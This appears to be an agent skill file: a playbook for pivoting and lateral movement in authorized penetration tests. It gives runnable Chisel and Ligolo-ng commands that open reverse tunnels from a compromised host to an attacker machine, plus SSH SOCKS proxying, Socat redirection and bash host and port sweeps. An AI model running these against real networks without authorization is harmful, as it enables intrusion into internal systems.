---
name: "infrastructure-pivoting"
description: "Advanced network pivoting, lateral movement, and internal tunneling techniques for authorized red team and penetration testing engagements. Covers Chisel, Ligolo-ng, SSH Dynamic Port Forwarding (SOCKS5), Proxychains-ng, Socat port redirection, NetExec, and internal host discovery across dual-home..."
---

# Infrastructure Pivoting & Lateral Movement Playbook

## Overview
When an initial foothold is established on an edge or perimeter system, pivoting enables testing of internal network segments that are not directly routable from the attacker machine.

---

## 1. SSH Dynamic Port Forwarding (SOCKS5)
The fastest, agentless way to pivot if SSH credentials or keys are compromised on a dual-homed Linux host.

```bash
# 1. Establish background SOCKS5 proxy on local port 1080
ssh -D 1080 -f -N -C -q msfadmin@<TARGET_IP>

# 2. Configure /etc/proxychains4.conf
# Ensure the last line reads:
# socks5 127.0.0.1 1080

# 3. Scan & access internal network (e.g. 10.10.10.0/24) through proxychains
proxychains4 nmap -sT -Pn -p 22,80,445,3389 10.10.10.5
proxychains4 curl -s http://10.10.10.5/
```

---

## 2. Chisel (Fast TCP/UDP Tunnel over HTTP/WebSockets)
Chisel wraps connections in encrypted WebSockets, bypassing restrictive egress firewalls.

### Setup Attacker Server (Kali)
```bash
# Start Chisel server with reverse port forwarding capability
chisel server --port 8000 --reverse
```

### Run Client on Compromised Host (Target)
```bash
# Linux client connects back and exposes SOCKS5 proxy on Kali port 1080
./chisel client <KALI_IP>:8000 R:socks
# Kali now has SOCKS5 proxy listening on 127.0.0.1:1080!
```

---

## 3. Ligolo-ng (Tun-based High Performance Pivoting)
Ligolo-ng sets up a TUN interface on Kali, allowing tools like Nmap (SYN scan `-sS`), Masscan, and raw packet tools to run without `proxychains`!

### Kali Controller:
```bash
# Setup TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo

# Run Ligolo proxy server
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

### Compromised Target:
```bash
./ligolo-agent -connect <KALI_IP>:11601 -ignore-cert
# In Kali ligolo console:
# session -> start
```

---

## 4. Local & Remote Port Redirection with Socat
When only a specific internal port needs to be forwarded out:

```bash
# On Compromised Host: Forward local port 8080 to an internal database server 10.10.10.5:3306
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:3306 &

# Now connecting to Compromised_Host:8080 connects directly to 10.10.10.5:3306
```

---

## 5. Internal Host Discovery from Compromised Host
Run pure bash/ping loops without installing external tools:

```bash
# Fast Ping Sweep across /24 subnet:
for i in $(seq 1 254); do
    (ping -c 1 -W 1 10.10.10.$i >/dev/null 2>&1 && echo "[+] Host Active: 10.10.10.$i") &
done; wait

# Fast TCP Port Scan via /dev/tcp (pure bash):
for port in 21 22 80 443 445 3389 8080; do
    (timeout 1 bash -c "</dev/tcp/10.10.10.5/$port" 2>/dev/null && echo "[+] Port $port OPEN on 10.10.10.5") &
done; wait
```
